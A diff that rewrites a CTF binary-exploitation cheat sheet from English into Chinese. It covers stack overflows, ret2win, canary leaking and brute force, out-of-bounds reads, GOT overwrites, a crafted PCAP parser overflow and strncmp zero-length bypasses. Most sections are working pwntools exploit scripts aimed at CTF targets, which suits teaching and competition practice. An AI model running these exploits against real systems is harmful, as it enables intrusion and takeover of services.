@@ -1,611 +1,502 @@
-# CTF Pwn - Overflow Basics
+---
 
-## Table of Contents
-- [Stack Buffer Overflow](#stack-buffer-overflow)
-  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
-  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
-  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
-  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
-  - [Finding Gadgets](#finding-gadgets)
-  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
-- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
-- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
-- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
-- [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
-- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
-- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
-- [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
-- [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
-- [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)
-- [Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)](#empty-token-strncmpn0-mac-bypass-ucsb-ictf-2018)
-- [Return Address LSB Overwrite + read() Chaining (TUCTF 2018)](#return-address-lsb-overwrite--read-chaining-tuctf-2018)
-- [Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)](#canary-trailing-byte-leak-via-padding-one-byte-past-null-hxp-2018)
-- [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
-- [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
-- [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
-- [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
+phase: binary
+vuln_class: [pwn, stack-overflow, canary, off-by-one, oob]
+title: 栈与基础溢出
+summary: 溢出题的第一步永远是「偏移算对 + 保护看清」。判据是溢出点在哪（栈/全局/结构体）、长度由谁控制、能不能只改一个字节。
+---
+
+# 栈与基础溢出
+
+ROP 与 shellcode 见 [[binary/漏洞利用/rop-and-shellcode.md|ROP 与 shellcode]]；堆见 [[binary/漏洞利用/heap-techniques.md|堆利用]]；总览见 [[binary/漏洞利用/index.md|漏洞利用总览]]。
+
+## 0. 判据速查
+
+| 现象 | 判据 | 去哪节 |
+|---|---|---|
+| 有 win 函数但要参数等于魔数 | `pop rdi; ret` + magic | §1 |
+| `movaps` 上 SIGSEGV | 栈没 16 字节对齐，多塞一个 `ret` | §2 |
+| 不知道偏移 | 反汇编看 `rbp - N`，偏移 = N + 8 | §3 |
+| payload 里不能含某些字符串 | `memmem` 过滤，断言避开 | §4 |
+| 找不到标准 gadget | 从 `cmp` 立即数里挖 | §5、§6 |
+| 菜单程序可 modify 名字 | 溢出到指针字段改指向 GOT | §7 |
+| 数量/价格用 `%d` 输入 | 负数绕过 | §8 |
+| 缓冲区与 canary 之间有标志位 | 只改标志不动 canary | §9 |
+| 遍历步长由用户控制 | 步长 > 缓冲长度 → 越界读 | §10 |
+| 服务器每连接 `fork()` | canary 逐字节爆破 | §11 |
+| 相邻全局变量 | CSV 分隔符溢出 | §12 |
+| 协议带长度字段 | 长度 > 实际数据 → 读越界 | §13 |
+| 自定义文件解析器 | `memcpy` 在长度校验之前 | §14 |
+| canary 低字节是 `\x00` | 覆盖那个 null 字节就能打印出来 | §15、§17 |
+| `strncmp(a,b,n)` 且 n 可控 | `n=0` 恒等 | §16 |
+| 只能改返回地址最低字节 | 同页内跳另一个函数 | §18、§20 |
+| 索引有检查但 `array[stride*idx]` | 检查的是索引不是偏移 | §19 |
+| 有符号索引配 `<= N` | 负数索引写到前面 | §20 |
+| 写循环里 `scanf` 可以失败 | 用格式错误跳过 canary 槽 | §21 |
 
 ---
 
-## Stack Buffer Overflow
-
-1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
-2. Check protections: `checksec --file=binary`
-3. No PIE + No canary = direct ROP
-4. Canary leak via format string or partial overwrite
-
-### ret2win with Parameter (Magic Value Check)
-
-**Pattern:** Win function checks argument against magic value before printing flag.
+## 1. ret2win（带魔数参数）
 
 ```c
-// Common pattern in disassembly
 void win(long arg) {
-    if (arg == 0x1337c0decafebeef) {  // Magic check
-        // Open and print flag
-    }
+    if (arg == 0x1337c0decafebeef) { /* 打印 flag */ }
 }
 ```
 
-**Exploitation (x86-64):**
 ```python
 from pwn import *
 
-# Find gadgets
-pop_rdi_ret = 0x40150b   # pop rdi; ret
-ret = 0x40101a           # ret (for stack alignment)
-win_func = 0x4013ac
-magic = 0x1337c0decafebeef
+pop_rdi_ret = 0x40150b
+ret         = 0x40101a        # 用于栈对齐
+win_func    = 0x4013ac
+magic       = 0x1337c0decafebeef
 
-offset = 112 + 8  # = 120 bytes to reach return address
+offset = 112 + 8              # 缓冲区在 rbp-0x70，返回地址在 rbp+8
 
-payload = b"A" * offset
-payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
+payload  = b"A" * offset
+payload += p64(ret)           # 对齐
 payload += p64(pop_rdi_ret)
 payload += p64(magic)
 payload += p64(win_func)
 ```
 
-**Finding the win function:**
-- Search for `fopen("flag.txt")` or similar in Ghidra
-- Look for functions with no XREF that check a magic parameter
-- Check for conditional print/exit patterns after parameter comparison
+**找 win 函数**：搜 `fopen("flag.txt")`；找无 XREF 的函数；找参数比较后条件打印/退出的模式。
 
-### Stack Alignment (16-byte Requirement)
+---
 
-Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
-- SIGSEGV in `movaps` instruction (SSE requires alignment)
-- Crash inside libc functions (printf, system, etc.)
+## 2. 栈对齐
 
-**Fix:** Add extra `ret` gadget before your ROP chain:
+现代 glibc 要求 `call` 前栈 16 字节对齐。症状：
+
+- `movaps` 上 SIGSEGV（SSE 要求对齐）
+- 崩在 libc 函数内部（`printf`/`system`）
+
+**修法**：链首多塞一个 `ret`。
+
 ```python
-payload = b"A" * offset
-payload += p64(ret)        # Align stack to 16 bytes
+payload  = b"A" * offset
+payload += p64(ret)           # 对齐
 payload += p64(pop_rdi_ret)
-# ... rest of chain
 ```
 
-### Offset Calculation from Disassembly
+**判据**：`one_gadget` 不中、`system` 崩、`puts` 正常但 `printf` 崩——先怀疑对齐，再怀疑别的。
+
+---
+
+## 3. 从反汇编算偏移
 
 ```asm
 push   %rbp
 mov    %rsp,%rbp
-sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
-...
-lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
-mov    $0xf0,%edx        ; read() size = 240 (overflow!)
+sub    $0x70,%rsp        ; 栈帧 0x70 = 112 字节
+lea    -0x70(%rbp),%rax  ; 缓冲区在 rbp-0x70
+mov    $0xf0,%edx        ; read() 长度 240（溢出！）
 ```
 
-**Calculate offset:**
-- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
-- Saved RBP is at `rbp` (0 offset from buffer end)
-- Return address is at `rbp + 8`
-- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes
+- 缓冲区起点 = `rbp - 0x70`
+- saved RBP 在 `rbp`
+- 返回地址在 `rbp + 8`
+- **总偏移 = 0x70 + 8 = 120**
 
-### Input Filtering (memmem checks)
+---
 
-Some challenges filter input using `memmem()` to block certain strings:
+## 4. 输入过滤
+
 ```python
 payload = b"A" * 120 + p64(gadget) + p64(value)
 assert b"badge" not in payload and b"token" not in payload
 ```
 
-### Finding Gadgets
+**坑**：过滤在服务端，本地 `assert` 只能自查。过滤词含 `\x00` 时几乎无解，得换手法（见 §16）。
+
+---
+
+## 5. 找 gadget
 
 ```bash
-# Find pop rdi; ret
 objdump -d binary | grep -B1 "pop.*rdi"
 ROPgadget --binary binary | grep "pop rdi"
-
-# Find simple ret (for alignment)
-objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
+objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"    # 单纯 ret
 ```
 
-### Hidden Gadgets in CMP Immediates
+---
 
-CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:
+## 6. 隐藏 gadget：从 `cmp` 立即数里挖
 
 ```asm
-# Example: cmpl $0xc35e415f, -0x4(%rbp)
-# Bytes: 81 7d fc 5f 41 5e c3
-#                  ^^ ^^ ^^ ^^
-# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
-# At +4: 41 5e c3    = pop r14; ret
-# At +5: 5e c3       = pop rsi; ret
+# cmpl $0xc35e415f, -0x4(%rbp)
+# 字节：81 7d fc 5f 41 5e c3
+#                ^^ ^^ ^^ ^^
+# +3 处：5f 41 5e c3 = pop rdi; pop r14; ret
+# +4 处：41 5e c3    = pop r14; ret
+# +5 处：5e c3       = pop rsi; ret
 ```
 
-**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.
+**判据**：函数很少的小二进制常常缺标准 gadget。查 `cmp`/`mov`/`test` 的大立即数——操作数字节可能正好解码成有用 gadget。
 
 ```python
 rop = ROP(elf)
-# pwntools finds these automatically
 for addr, gadget in rop.gadgets.items():
-    print(hex(addr), gadget)
+    print(hex(addr), gadget)      # pwntools 会自动找到这些
 ```
 
-## Struct Pointer Overwrite (Heap Menu Challenges)
+---
 
-**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.
+## 7. 结构体指针覆盖（菜单题）
 
-**Struct layout example:**
 ```c
 struct Student {
-    char name[36];      // offset 0x00 - data buffer
-    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
+    char name[36];      // offset 0x00
+    int *grade_ptr;     // offset 0x24 —— 指向独立分配
     float gpa;          // offset 0x28
-};  // total: 0x2c (44 bytes)
+};  // 共 0x2c
 ```
 
-**Exploitation:**
 ```python
-from pwn import *
-
 WIN = 0x08049316
-GOT_TARGET = 0x0804c00c  # printf@GOT
+GOT_TARGET = 0x0804c00c       # printf@GOT
 
-# 1. Create object (allocates struct + sub-allocations)
 create_student("AAAA", 5, 3.5)
 
-# 2. Modify name - overflow into pointer field with GOT address
-payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
-modify_name(0, payload)
+# 1. modify 名字，溢出到指针字段，填 GOT 地址
+modify_name(0, b'A' * 36 + p32(GOT_TARGET))
 
-# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
-modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry
+# 2. modify 分数，scanf("%d", 被改的指针) 直接写 GOT
+modify_grade(0, str(WIN))
 
-# 4. Trigger overwritten function -> jumps to win
+# 3. 触发被覆盖的函数 → 跳到 win
 ```
 
-**GOT target selection strategy:**
-- Identify which libc functions the `win` function calls internally
-- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
-- Prefer functions called in the main loop AFTER the write
+### GOT 目标怎么选
 
-| Win uses | Safe GOT targets |
-|----------|-------------------|
+- 先看 `win` 内部调了哪些 libc 函数
+- **绝不能覆盖 `win` 自己要用的 GOT 项**（无限递归或直接崩）
+- 优先选「写完之后主循环还会调」的函数
+
+| `win` 用到 | 安全的 GOT 目标 |
+|---|---|
 | puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
 | printf, system | puts, exit, free |
-| system only | puts, printf, exit |
+| 只用 system | puts, printf, exit |
 
-## Signed Integer Bypass (Negative Quantity)
+---
 
-`scanf("%d")` without sign check; negative input bypasses unsigned comparisons. See [[binary/漏洞利用/advanced-exploits.md#signed-integer-bypass-negative-quantity|advanced-exploits.md]] for full details.
+## 8. 有符号整数绕过
 
-## Canary-Aware Partial Overflow
+`scanf("%d")` 不检查符号；负数量 × 单价 = 负总价，绕过余额/上限检查。详见 [[binary/漏洞利用/advanced-exploits.md|进阶原语合集]]。
 
-Overflow `valid` flag between buffer and canary without touching the canary. Use `./` as no-op path padding for precise length control. See [[binary/漏洞利用/advanced-exploits.md#canary-aware-partial-overflow|advanced-exploits.md]] for full exploit chain.
+---
 
-## OOB Read via Stride/Rate Leak (DiceCTF 2026)
+## 9. Canary 感知的部分溢出
 
-**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).
+缓冲区与 canary 之间有一个 `valid` 标志位。只改它，不动 canary。用 `./` 当无操作路径填充来精确控制长度。
 
-**Stack layout:**
+---
+
+## 10. 步长越界读（stride/rate）
+
+**判据**：遍历函数用用户可控步长 `rate`，且以 null 结尾为停止条件。`rate > 缓冲区长度` 时直接跳过 null，读到相邻栈数据。
+
 ```text
-input_buf  [0-31]    <- user input (null at byte 31)
-crushed    [32-63]   <- output buffer
-canary     [72-79]   <- stack canary
+input_buf  [0-31]    用户输入（第 31 字节是 null）
+crushed    [32-63]   输出缓冲
+canary     [72-79]
 saved rbp  [80-87]
-return addr [88-95]  <- code pointer (defeats PIE)
+return addr[88-95]   代码指针（破 PIE）
 ```
 
-**Vulnerable pattern:**
 ```c
 void crush_string(char *input, char *output, int rate, int output_max_len) {
-    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
-        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
-    }
+    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate)
+        output[out_idx++] = input[i];    // rate > 缓冲长度就跳过 null
 }
 ```
 
-**Exploitation:**
 ```python
-from pwn import *
-
-# Leak canary bytes 1-7 (byte 0 always 0x00)
+# 泄 canary 第 1-7 字节（第 0 字节恒为 0x00）
 canary = b'\x00'
-for offset in range(73, 80):  # canary at offsets 72-79
-    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
-    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
-    p.sendline(b'2')           # output length = 2
-    resp = p.recvline()
-    canary += resp[1:2]        # second char is leaked byte
+for offset in range(73, 80):
+    p.sendline(b'A' * 31)                 # 填满缓冲，null 落在第 31 字节
+    p.sendline(str(offset).encode())      # rate = offset → 读 input[0] 再读 input[offset]
+    p.sendline(b'2')                      # 输出长度 2
+    canary += p.recvline()[1:2]
 
-# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
+# 泄返回地址第 0-5 字节（高 2 字节在用户空间恒为 0）
 ret_addr = b''
 for offset in range(88, 94):
-    p.sendline(b'A' * 31)
-    p.sendline(str(offset).encode())
-    p.sendline(b'2')
-    resp = p.recvline()
-    ret_addr += resp[1:2]
+    p.sendline(b'A' * 31); p.sendline(str(offset).encode()); p.sendline(b'2')
+    ret_addr += p.recvline()[1:2]
 
 pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
-admin_portal = pie_base + admin_offset
 
-# Overflow gets() with leaked canary + computed address
-payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
-p.sendline(payload)
+payload = b'A' * 24 + canary + p64(0) + p64(pie_base + admin_offset)
 ```
 
-**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.
+**关键**：每轮只泄一个字节，靠控制哪个偏移落到目标字节上。够多轮就能把 canary 与返回地址全泄出来，同时破 canary 与 PIE。
 
-**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.
+---
 
-## Stack Canary Byte-by-Byte Brute Force on Forking Servers
+## 11. fork 服务器的 canary 逐字节爆破
 
-**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.
+**判据**：每个连接 `fork()` 一个子进程，子进程继承同一个 canary。
 
-**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.
+**结构**：第 0 字节恒为 `\x00`（防字符串泄漏），其余 7 字节随机。x86-64 共 8 字节，x86-32 共 4 字节。
 
-**Exploitation:**
 ```python
-from pwn import *
+OFFSET = 64       # 到 canary 的偏移
 
-OFFSET = 64  # bytes to canary (buffer size)
-HOST, PORT = "target", 1337
-
-def try_byte(known_canary, guess_byte):
-    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
+def try_byte(known, guess):
     p = remote(HOST, PORT)
-    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
-    p.send(payload)
+    p.send(b'A' * OFFSET + known + bytes([guess]))
     try:
-        resp = p.recv(timeout=1)
-        p.close()
-        return True   # No crash → byte is correct
-    except:
-        p.close()
-        return False  # Crash → wrong byte
+        p.recv(timeout=1); p.close(); return True    # 没崩 = 猜对
+    except Exception:
+        p.close(); return False
 
-# Byte 0 is always \x00
 canary = b'\x00'
-
-# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
-for byte_pos in range(1, 8):
+for pos in range(1, 8):
     for guess in range(256):
         if try_byte(canary, guess):
-            canary += bytes([guess])
-            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
-            break
+            canary += bytes([guess]); break
     else:
-        print(f"Failed at byte {byte_pos}")
         break
 
-print(f"Full canary: {canary.hex()}")
-
-# Now overflow with correct canary + ROP chain
 p = remote(HOST, PORT)
-payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
-p.sendline(payload)
+p.sendline(b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr))
 ```
 
-**Prerequisites:**
-- Server must `fork()` per connection (canary stays constant across children)
-- Overflow must be controllable byte-by-byte (no all-at-once read)
-- Distinguishable crash vs success response (timeout, error message, or connection behavior)
+**三个前提**：
+- 服务器必须每连接 `fork()`（canary 跨子进程恒定）
+- 溢出必须能逐字节控制（不能一次读完）
+- 崩与不崩可区分（超时、错误信息、连接行为）
 
-**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.
-
-**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).
+**次数**：平均 7×128 = 896，最多 7×256 = 1792。相比一次性爆 8 字节的 2^56，完全可行。
 
 ---
 
-## Global Buffer Overflow (CSV Injection)
+## 12. 全局缓冲区溢出（CSV 注入）
 
-**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [[binary/漏洞利用/advanced.md|advanced.md]] for full exploit pattern.
+相邻全局变量；多塞几个 CSV 分隔符就能改掉文件名指针。详见 [[binary/漏洞利用/advanced.md|语义误用]]。
 
 ---
 
-## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)
+## 13. 协议长度字段栈泄漏
 
-Custom network protocols that echo data based on a length field in the request header can leak stack memory when the length exceeds the actual data sent (similar to Heartbleed).
+**判据**：协议头里有长度字段，服务端按它决定回多少字节（Heartbleed 同构）。
 
 ```python
-from pwn import *
-
-# Custom protocol: [4-byte magic][1-byte length][payload]
-# Server echoes back `length` bytes of the response buffer
-# If length > actual payload, server leaks stack/heap memory
-
 io = remote('target.ctf', 1337)
 
-# Normal request: 5 bytes of data, length = 5
-# Bleeding request: 5 bytes of data, length = 255
-magic = b'\x00\x01\x02\x03'
-length_field = b'\xff'  # request 255 bytes back
-payload = b'AAAAA'      # only send 5 bytes
+magic  = b'\x00\x01\x02\x03'
+length = b'\xff'          # 要 255 字节回来
+payload = b'AAAAA'        # 实际只发 5 字节
 
-io.send(magic + length_field + payload)
+io.send(magic + length + payload)
 leaked = io.recv(255)
 
-# Search leaked memory for flag pattern
 if b'flag{' in leaked or b'CTF{' in leaked:
-    log.success(f"Flag found in leaked data!")
+    log.success("flag 在泄漏数据里")
 
-# Alternatively, search for addresses (libc pointers, stack addresses)
 for i in range(0, len(leaked) - 8, 8):
     addr = u64(leaked[i:i+8])
     if 0x7f0000000000 < addr < 0x7fffffffffff:
-        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
+        log.info(f"疑似 libc/栈地址 @ {i}: {hex(addr)}")
 ```
 
-**Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.
+**关键**：任何「服务端用客户端给的长度决定返回多少数据」的协议都能这么打。读越界会带出 flag、地址、canary。
 
 ---
 
-## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)
+## 14. 解析器栈溢出（未校验 `memcpy` 长度）
 
-**Pattern (PCAP Trap):** Custom file parser (e.g., PCAP, image, archive) allocates a fixed-size stack buffer but allows input records with lengths exceeding the buffer. A `memcpy` copies the full record into the stack buffer before length validation, overwriting saved registers and return address.
+**判据**：自定义文件解析器（PCAP/图片/归档）按「预期最大尺寸」分配固定栈缓冲，但格式允许更大的记录，且 `memcpy` 在校验之前。
 
 ```python
-from pwn import *
-
-# Example: PCAP parser with 0x10000 byte stack buffer
-# but PCAP packets can specify up to 0x20000 bytes (snaplen)
-# memcpy(stack_buf, packet_data, packet_len) has no bounds check
-
-elf = ELF('./pcap_parser')
-context.binary = elf
-
-# Step 1: Determine overflow offset
-# Buffer is 0x10000 bytes on stack
-# After buffer: saved callee-save registers (rbx, r12, ...) then return address
 BUF_SIZE = 0x10000
-# Offset to saved registers depends on function prologue
-# Check disassembly: push rbx; push r12; sub rsp, 0x10000
-OFFSET_RBX = BUF_SIZE       # first saved register
-OFFSET_R12 = BUF_SIZE + 8   # second saved register
-OFFSET_RET = BUF_SIZE + 16  # return address
+OFFSET_RBX = BUF_SIZE
+OFFSET_R12 = BUF_SIZE + 8
+OFFSET_RET = BUF_SIZE + 16
 
-# Step 2: Craft payload with register restoration
-# Callee-saved registers must be valid or the function epilogue crashes
-# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
-# r12: set to value that exits cleanly (e.g., loop terminator = 1)
+bss_addr = elf.bss()
+win_addr = elf.symbols['win']
 
-bss_addr = elf.bss()         # Readable memory for rbx
-win_addr = elf.symbols['win'] # Target function
+payload  = b'A' * BUF_SIZE
+payload += p64(bss_addr)                   # rbx → 可读地址
+payload += p64(1)                          # r12 = 1（循环退出条件）
+payload += p64(elf.symbols['ret_gadget'])  # 对齐
+payload += p64(win_addr)
+```
 
-payload = b'A' * BUF_SIZE
-payload += p64(bss_addr)      # rbx -> valid readable address
-payload += p64(1)             # r12 = 1 (loop exit condition)
-payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
-payload += p64(win_addr)      # return to win()
+用合法容器包起来（以 PCAP 为例）：
 
-# Step 3: Wrap in valid file format container
-# For PCAP: valid global header + packet header with large caplen
+```python
 import struct
 
-# PCAP global header
 pcap_header = struct.pack('<IHHIIII',
-    0xa1b2c3d4,  # magic number
-    2, 4,        # version 2.4
-    0,           # thiszone
-    0,           # sigfigs
-    0x20000,     # snaplen (max packet size - larger than stack buffer!)
-    1            # network (LINKTYPE_ETHERNET)
-)
+    0xa1b2c3d4, 2, 4, 0, 0,
+    0x20000,        # snaplen 比栈缓冲大 —— 这就是洞
+    1)
+pkt_header = struct.pack('<IIII', 0, 0, len(payload), len(payload))
 
-# PCAP packet record header
-pkt_ts_sec = 0
-pkt_ts_usec = 0
-pkt_caplen = len(payload)   # captured length = our overflow payload
-pkt_origlen = len(payload)
-
-pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)
-
-# Build malicious PCAP
-pcap_data = pcap_header + pkt_header + payload
-
-with open('exploit.pcap', 'wb') as f:
-    f.write(pcap_data)
-
-# Step 4: Send to target
-p = remote('target', 1337)
-p.send(pcap_data)
-p.interactive()
+open('exploit.pcap', 'wb').write(pcap_header + pkt_header + payload)
 ```
 
-**Key insight:** Custom file parsers often allocate fixed-size stack buffers based on a "maximum expected size" but the file format allows specifying larger records. The `memcpy` happens before the length check, creating a classic stack overflow. When exploiting, you must restore callee-saved registers to valid values in the overflow payload -- the function epilogue pops them before returning, and invalid values cause crashes before the return address is reached. Common requirements: `rbx` must point to readable memory (use BSS), loop counter registers must satisfy exit conditions.
+### callee-saved 恢复清单（必查，否则 epilogue 先崩）
 
-**Callee-saved register restoration checklist:**
-1. Identify which registers the function pushes in its prologue (`push rbx`, `push r12`, etc.)
-2. Determine the order they are restored in the epilogue (reverse of push order)
-3. Set `rbx` to any readable address (BSS, GOT, or known mapped page)
-4. Set loop counters (`r12`, `r13`) to values that terminate any loops cleanly
-5. Add a `ret` gadget for 16-byte stack alignment before the win function address
+1. 看函数序言 push 了哪些寄存器（`push rbx`、`push r12` …）
+2. 确认 epilogue 的恢复顺序（push 的逆序）
+3. `rbx` 设成任意可读地址（BSS/GOT/已知映射页）
+4. 循环计数寄存器（`r12`/`r13`）设成能让循环正常退出的值
+5. win 地址前加 `ret` gadget 做 16 字节对齐
 
-**When to recognize:** Challenge involves a custom parser for a binary file format (PCAP, ELF, image, protocol buffer). The parser uses `memcpy` or `read` with a length field from the input. Check if the buffer size is smaller than the maximum length the format allows.
-
-**References:** MetaCTF Flash CTF 2026 "PCAP Trap"
+**判据**：题目是自定义二进制格式解析器（PCAP/ELF/图片/protobuf），解析器用输入里的长度字段调 `memcpy`/`read`，且缓冲尺寸小于格式允许的最大长度。
 
 ---
 
-## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)
+## 15. Canary null 字节覆盖泄漏（CSAW 2017）
 
-**Pattern:** Stack canaries always end with a null byte (the low byte is `\x00`) to prevent string-based leaks. If an overflow allows overwriting just that null byte with a non-null character, `puts()` or `printf("%s")` will continue printing past the overwritten byte and output the remaining 7 canary bytes. A return-to-main provides a second exploitation stage where the full canary is known.
+**判据**：canary 低字节恒为 `\x00`（防字符串泄漏）。只覆盖那个 null 字节，`puts`/`printf("%s")` 就会继续打印后面 7 个 canary 字节。
 
-**Stack layout:**
 ```text
-[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
-                  ^--- overwrite only this byte with 'A'
-                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
+[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [ret]
+                 ^--- 只覆盖这一字节为 'A'
+                 → puts() 打印 'A' + 7 个 canary 字节 + 更多栈数据
 ```
 
-**Exploitation:**
 ```python
-from pwn import *
-
-# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
-p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
+p.send(b'A' * buf_size + b'B')        # 'B' 覆盖 canary 的 null
 leak = p.recvline()
-# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
 canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
-canary_val = u64(canary)
-log.info(f"Leaked canary: {hex(canary_val)}")
 
-# Stage 2: Return-to-main for clean second exploitation
-# First stage payload returned to main() — now build full ROP chain
+# 第二阶段：返回 main 重置栈帧
 p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
 ```
 
-**Why return-to-main:** After leaking the canary by overwriting its null byte, the canary is corrupted — the process will crash on return. Return-to-main (via a first-stage overflow) resets the stack frame cleanly and allows a second input with the now-known canary value.
-
-**Key insight:** The canary's null byte terminator is a weakness — overwriting only it makes string functions print the canary value. Return-to-main provides a second exploitation opportunity with the leaked canary, enabling full ROP chain construction.
-
-**References:** CSAW 2017
+**为什么要返回 main**：泄完之后 canary 已被破坏，进程返回必崩。第一阶段的溢出顺手返回 `main`，栈帧干净重置，第二次输入时 canary 已知。
 
 ---
 
-## Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)
+## 16. `strncmp(n=0)` 绕过
 
-**Pattern:** A MAC or auth token check extracts `n` (comparison length) from a user-supplied field and then calls `strncmp(expected, supplied, n)`. When `n == 0`, `strncmp` returns 0 regardless of input — every token is accepted.
+**判据**：比较长度 `n` 来自用户输入，`n == 0` 时 `strncmp` 恒返回 0——任何 token 都通过。
 
-**Vulnerable code:**
 ```c
-int n = atoi(user_len);            // attacker controls length
-if (strncmp(expected_mac, user_mac, n) == 0) {
-    grant_access();
-}
+int n = atoi(user_len);
+if (strncmp(expected_mac, user_mac, n) == 0) grant_access();
 ```
 
-**Exploit:** Send the token with `len=0` (or a length field that parses to zero) and an arbitrary MAC.
+**打**：把长度字段设成 0（或解析成 0 的值），MAC 随便填。
 
-**Key insight:** Any variable-length comparator (`strncmp`, `memcmp`, `bcmp`) returns equality for zero-length input. Validate the length separately: reject `n <= 0`, or use `CRYPTO_memcmp`/`hmac_equal` and compare full fixed-size buffers. The same bug appears when the length comes from a client-supplied HMAC size or TLV header.
-
-**References:** UCSB iCTF 2018 — writeup 10009
+**关键**：所有变长比较器（`strncmp`/`memcmp`/`bcmp`）对零长度输入都返回相等。长度必须**独立校验**（拒绝 `n <= 0`），或用固定长度缓冲 + `CRYPTO_memcmp`。同一个洞也出现在「客户端给 HMAC 长度」或「TLV 头里的长度」上。
 
 ---
 
